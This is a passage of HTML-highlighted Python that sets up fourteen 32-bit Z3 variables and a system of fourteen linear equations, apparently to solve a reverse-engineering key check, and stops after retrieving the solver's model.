<span class="n">v</span> <span class="o">=</span> <span class="p">[</span><span class="nc">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">x</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">14</span><span class="p">)]</span>

<span class="n">equations</span> <span class="o">=</span> <span class="p">[</span>
    <span class="mh">0x6E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1C3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x348</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1F8</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x357</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x46</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x16F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2FE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x17A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x15A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x326</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x190</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x129</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2ED</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x29CB</span><span class="p">,</span>
    <span class="mh">0x2A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3B2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2C1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x23A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3D1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x152</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x221</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2FC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0DF</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x36F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1A2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x179</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x284</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x64</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0F0ED</span><span class="p">,</span>
    <span class="mh">0x328</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3CD</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x329</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0EA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x12B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x337</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x262</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x37</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0A4</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x383</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2D5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x66098</span><span class="p">,</span>
    <span class="mh">0x66</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3C9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0C0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0BD</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x9D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2D1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x299</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x38E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x15</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x14E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x280</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0E1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x128</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x50</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x6CE4</span><span class="p">,</span>
    <span class="mh">0x2ED</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x8A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x155</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x8C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x239</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x259</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x286</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1DA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x154</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x196</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x97</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x26D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3E0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1EB</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x150DD</span><span class="p">,</span>
    <span class="mh">0x46</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2DF</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x243</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x78</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0EE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x99</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0C5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0EB</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0AE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x28F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x65</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x147</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3C2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1E68B</span><span class="p">,</span>
    <span class="mh">0x264</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2BE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3B5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1D3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x150</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3C1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3E4</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x58</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x19C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x261</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x17F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x167</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x18490</span><span class="p">,</span>
    <span class="mh">0x0B3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x63</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0E0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x24</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x37C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x33</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x11E</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x13D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x139</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3DC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x14C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2DD</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2B3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x3CC54</span><span class="p">,</span>
    <span class="mh">0x102</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x115</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0D3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0DC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3A1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x35C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0ED</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x141</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x19C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2B6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x24B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1B9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x45670</span><span class="p">,</span>
    <span class="mh">0x3C4</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x305</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0A9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x87</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0E6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x30</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x20F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3D0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x94</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x56</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x224</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1B5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x183</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x21A0F</span><span class="p">,</span>
    <span class="mh">0x256</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x157</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x181</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x306</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x243</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x373</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x1A3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x223</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x200</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x365</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x56</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1B6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x39C</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0FFFE3896</span><span class="p">,</span>
    <span class="mh">0x0A3</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2B2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x22D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x3D6</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x9A</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x76</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2A0</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x63</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x373</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x15</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x3B9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x214</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x232</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x225</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x22874</span><span class="p">,</span>
    <span class="mh">0x151</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x153</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x25F</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x187</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2AC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1CC</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x155</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2F5</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x22D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x17B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x377</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x0B2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x294</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2CE</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0FFFBEC4D</span><span class="p">,</span>
    <span class="mh">0x2AA</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x95</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x83</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x25B</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x77</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x2E1</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x39D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x251</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x0A2</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x27D</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x268</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x2F9</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x14</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x115</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x3C5E6</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">equation</span> <span class="ow">in</span> <span class="n">equations</span><span class="p">:</span>
    <span class="n">solver</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">equation</span><span class="p">)</span>

<span class="k">if</span> <span class="n">solver</span><span class="p">.</span><span class="nf">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
    <span class="n">model</span> <span class="o">=</span> <span class="n">solver</span><span class="p">.</span><span class="nf">model</span><span class="p">()</span>
